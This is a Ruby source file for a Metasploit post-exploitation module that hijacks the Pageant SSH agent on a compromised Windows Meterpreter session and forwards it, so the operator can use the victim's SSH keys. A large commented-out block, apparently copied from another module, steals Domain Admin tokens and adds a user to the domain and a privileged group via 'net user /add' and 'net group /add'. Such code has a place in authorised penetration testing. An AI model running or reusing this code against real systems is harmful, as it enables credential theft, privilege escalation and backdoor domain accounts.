##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'tmpdir'

class Metasploit3 < Msf::Post

  include Msf::Post::Windows::Priv

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Forward Pageant',
        'Description'   => %q{
            This module forwards Pageant.
          },
        'License'       => MSF_LICENSE,
        'Author'        => 'Stuart Morgan <stuart.morgan[at]mwrinfosecurity.com>',
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ]
      ))
    #register_options(
    #  [
    #  ], self.class)
  end

  def run

    ## load incognito
    if(!session.pageantjacker)
      session.core.use("pageantjacker")
    end

    if(!session.pageantjacker)
      print_status("Failed to load pageantjacker on #{session.sid} (#{session.session_host})")
      return false
    end

    sockpath = "#{::Dir::Tmpname.tmpdir}/#{::Dir::Tmpname.make_tmpname('pageantjacker', 5)}"
    if ::File.exists?(sockpath)
        print_line("Your requested socket (#{sockpath}) already exists. Remove it or choose another path and try again.")
        return false
    end 

    ::UNIXServer.open(sockpath) {|serv|
      print_status("Launched listening socket on #{sockpath}.")
      print_status("Set your SSH_AUTH_SOCK variable to #{sockpath} (export SSH_AUTH_SOCK=\"#{sockpath}\"")
      print_status("Now use any tool normally (e.g. ssh-add)")
    
      loop { 
        s = serv.accept
        loop {
          socket_request_data = s.recvfrom(8192)
          break if socket_request_data.nil? || socket_request_data.first.nil? || socket_request_data.first.empty?
          response_data = client.pageantjacker.forward_to_pageant(socket_request_data.first, socket_request_data.first.size)
          s.send response_data,0 if !response_data.nil?
        }   
      }   
    }   

    if ::File.exists?(sockpath)
        print_line("Cleaning up; removing #{sockpath}")
        ::File.delete(sockpath)
    else
        print_line("Unable to remove socket #{sockpath}")
    end

  end

#  def get_system
#    print_status("Trying to get SYSTEM privileges")
#    results = session.priv.getsystem
#    if results[0]
#      print_good("Got SYSTEM privileges")
#    else
#      print_error("Could not obtain SYSTEM privileges")
#    end
#  end
#
#  def priv_check
#    if is_system?
#      privs = session.sys.config.getprivs
#      if privs.include?("SeAssignPrimaryTokenPrivilege") and privs.include?("SeIncreaseQuotaPrivilege")
#        return true
#      else
#        return false
#      end
#    elsif is_admin?
#      return true
#    else
#      return false
#    end
#  end
#
#  ## steal domain admin token
#  ## return code: bool
#  def steal_token(domain_user,domain)
#    if session.sys.config.getuid() == domain_user or domain_user == ''
#      return true
#    end
#
#    ## load incognito
#    if(! session.incognito)
#      session.core.use("incognito")
#    end
#
#    if(! session.incognito)
#      print_status("!! Failed to load incognito on #{session.sid} / #{session.session_host}")
#      return false
#    end
#
#    ## verify domain_user contains a domain
#    if domain_user !~ /\\/
#      domain_user = "#{domain}\\#{domain_user}"
#    else
#      domain_user = ''
#    end
#
#    ## token is a PID
#    target_pid = ''
#    if (datastore['TOKEN'] =~ /^\d+$/)
#      pid = datastore['TOKEN']
#
#      session.sys.process.get_processes().sort_by { rand }.each do |x|
#        if ( pid == x['pid'])
#          target_pid = pid
#        end
#      end
#    ## token is a Domain User
#    else
#      session.sys.process.get_processes().sort_by { rand }.each do |x|
#        if ( x['user'] == domain_user and target_pid == '')
#          target_pid = x['pid']
#          print_status("Found token for #{domain_user}")
#        end
#      end
#    end
#
#    if target_pid != ''
#      # Do the migration
#      print_status("Stealing token of process ID #{target_pid}")
#      res = session.sys.config.steal_token(target_pid)
#      if  domain_user != ''
#        domain_user = session.sys.config.getuid()
#      else
#        print_status("Stealing token of process ID #{target_pid}")
#        res = session.sys.config.steal_token(target_pid)
#        if  domain_user != ''
#          domain_user = session.sys.config.getuid()
#        end
#      end
#
#      if session.sys.config.getuid() != domain_user
#        print_error "Steal Token Failed (running as: #{session.sys.config.getuid()})"
#        return false
#      end
#    else
#      print_status("No process tokens found.")
#      if (domain_user != '')
#        vprint_status("Trying impersonate_token technique...")
#        res = session.incognito.incognito_impersonate_token(domain_user)
#      else
#        return false
#      end
#    end
#
#    return true
#  end
#
#  ## enumerate if the session has a domain admin token on it
#  ## Return: token_found,token_user,current_user; otherwise false
#  def token_hunter(domain)
#    ## gather data
#    usr_res = run_cmd("net groups \"Domain Admins\" /domain",false)
#    domain_admins = get_members(usr_res.split("\n"))
#
#    ## Make sure we meet the requirements before running the module
#    if not priv_check
#      print_error("Abort! Did not pass the priv check")
#      return false
#    end
#
#    ## load incognito
#    if(! session.incognito)
#      session.core.use("incognito")
#    end
#
#    if(! session.incognito)
#      print_error("!! Failed to load incognito on #{session.sid} / #{session.session_host}")
#      return false
#    end
#
#    domain_admins.each do |da_user|
#      ## current user
#      if "#{domain}\\#{da_user}" == session.sys.config.getuid()
#        print_good "Found Domain Admin Token: #{session.sid} - #{session.session_host} - #{da_user} (Current User)"
#        return true,'',true
#      end
#
#      ## parse delegation tokens
#      res = session.incognito.incognito_list_tokens(0)
#      if res
#        res["delegation"].split("\n").each do |user|
#          ndom,nusr = user.split("\\")
#          if not nusr
#            nusr = ndom
#            ndom = nil
#          end
#          if ndom == domain and da_user == nusr
#            sid = session.sid
#            peer = session.session_host
#            print_good("Found Domain Admin Token: #{sid} - #{peer} - #{nusr} (Delegation Token)")
#            return true,nusr,false
#          end
#        end
#      end
#
#      ## parse process list
#      session.sys.process.get_processes().each do |x|
#        if ( x['user'] == "#{domain}\\#{da_user}")
#          target_pid = x['pid']
#          sid = session.sid
#          peer = session.session_host
#          report_note(
#            :host   => session,
#            :type   => 'domain.token.pid',
#            :data   => { :pid=>target_pid, :sid=>sid, :peer=>peer, :user=>da_user },
#            :update => :unique_data
#          )
#          print_good("Found Domain Admin Token: #{sid} - #{peer} - #{da_user} (PID: #{target_pid})")
#          return true ,da_user, false
#        end
#      end
#    end
#
#    return false
#  end
#
#  # Run Method for when run command is issued
#  def run
#    print_status("Running module on #{sysinfo['Computer']}")
#
#    ## get system, if requested
#    if (session.sys.config.getuid() !~ /SYSTEM/ and datastore['GETSYSTEM'])
#      get_system
#    end
#
#    ## enum domain
#    domain = get_domain()
#    if domain.nil?
#      return
#    end
#
#    ## steal token if neccessary
#    if (datastore['TOKEN'] == '')
#      token_found,token_user,current_user = token_hunter(domain)
#
#      return if token_found == false
#
#      datastore['TOKEN'] = token_user if current_user == false
#    end
#
#    ## steal token
#    steal_token_res = steal_token(datastore['TOKEN'],domain)
#    return if steal_token_res == false
#
#    ## verify not running as SYSTEM
#    if (session.sys.config.getuid() =~ /SYSTEM/)
#      print_error("Stealing a Token failed! Still running as SYSTEM")
#      return
#    else
#      print_status("Now executing commands as #{session.sys.config.getuid()}" )
#    end
#
#    already_user = false
#    already_member_group = false
#
#    ## Add user to the domain
#    if (datastore['ADDTODOMAIN'] == true)
#      user_add_res = run_cmd("net user \"#{datastore['USERNAME']}\" /domain",false)
#
#      if (user_add_res =~ /The command completed successfully/ and user_add_res =~ /Domain Users/)
#        print_status("#{datastore['USERNAME']} is already a member of the #{domain} domain")
#        already_user = true
#      else
#        cmd = "net user \"#{datastore['USERNAME']}\" \"#{datastore['PASSWORD']}\" /domain /add"
#        print_status("Adding '#{datastore['USERNAME']}' as a user to the #{domain} domain")
#        add_user_to_domain_res = run_cmd(cmd)
#      end
#    end
#
#    ## Add user to a domain group
#    if datastore['ADDTOGROUP'] == true
#      ## check if user is already a member of the group
#      group_add_res = run_cmd("net groups \"#{datastore['GROUP']}\" /domain",false)
#
#      # Parse Returned data
#      members = get_members(group_add_res.split("\n"))
#
#      # Show results if we have any, Error if we don't
#      if ! members.empty?
#        members.each do |user|
#          if (user == "#{datastore['USERNAME']}")
#            print_status("#{datastore['USERNAME']} is already a member of the '#{datastore['GROUP']}' group")
#            already_member_group = true
#          end
#        end
#
#        if already_member_group == false
#          print_status("Adding '#{datastore['USERNAME']}' to the '#{datastore['GROUP']}' Domain Group")
#          cmd = "net group \"#{datastore['GROUP']}\" \"#{datastore['USERNAME']}\" /domain /add"
#          add_user_to_group_res = run_cmd(cmd)
#        end
#      end
#    end
#
#    ## drop token
#    if (datastore['TOKEN'] != '')
#      res = session.sys.config.drop_token
#    end
#
#    ## verify user was added to domain or domain group
#    if datastore['ADDTOGROUP'] == true
#      if already_member_group == false
#        net_groups_res = run_cmd("net groups \"#{datastore['GROUP']}\" /domain",false)
#
#        # Parse Returned data
#        members = get_members(net_groups_res.split("\n"))
#
#        # Show results if we have any, Error if we don't
#        if ! members.empty?
#          members.each do |user|
#            if (user == "#{datastore['USERNAME']}")
#              print_good("#{datastore['USERNAME']} is now a member of the '#{datastore['GROUP']}' group!")
#              return
#            end
#          end
#          print_error("Error adding '#{datastore['USERNAME']}' to the '#{datastore['GROUP']}' group")
#          return
#        else
#          print_error("No members found for #{datastore['GROUP']}")
#        end
#      end
#    else
#      if already_user == false
#        net_user_res = run_cmd("net user \"#{datastore['USERNAME']}\" /domain",false)
#
#        if (net_user_res =~ /The command completed successfully/ and net_user_res =~ /Domain Users/)
#          print_good("#{datastore['USERNAME']} is now a member of the #{domain} domain!")
#        else
#          print_error("Error adding '#{datastore['USERNAME']}' to the domain. Check the password complexity.")
#        end
#      end
#    end
#  end
#
#  def get_members(results)
#    members = []
#
#    # Usernames start somewhere around line 6
#    results = results.slice(6, results.length)
#    # Get group members from the output
#    results.each do |line|
#      line.split("  ").compact.each do |user|
#        next if user.strip == ""
#        next if user =~ /-----/
#        next if user =~ /The command completed successfully/
#        members << user.strip
#      end
#    end
#
#    return members
#  end
#
#  ## get value from registry key
#  def reg_getvaldata(key,valname)
#    value = nil
#    begin
#      root_key, base_key = client.sys.registry.splitkey(key)
#      open_key = client.sys.registry.open_key(root_key, base_key, KEY_READ)
#      v = open_key.query_value(valname)
#      value = v.data
#      open_key.close
#    end
#    return value
#  end
#
#  ## return primary domain from the registry
#  def get_domain()
#    domain = nil
#    begin
#      subkey = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History"
#      v_name = "DCName"
#      dom_info = reg_getvaldata(subkey, v_name)
#      if not dom_info.nil? and dom_info =~ /\./
#        foo = dom_info.split('.')
#        domain = foo[1].upcase
#      else
#        print_error("Error parsing output from the registry. (#{dom_info})")
#      end
#    rescue
#      print_error("This host is not part of a domain.")
#    end
#    return domain
#  end
#
#  ## execute cmd and return the response
#  ## is required since we need to use the 'UseThreadToken' hash
#  def run_cmd(cmd,token=true)
#    opts = {'Hidden' => true, 'Channelized' => true, 'UseThreadToken' => token}
#    process = session.sys.process.execute(cmd, nil, opts)
#    res = ""
#    while (d = process.channel.read)
#      break if d == ""
#      res << d
#    end
#    process.channel.close
#    process.close
#    return res
#  end
end
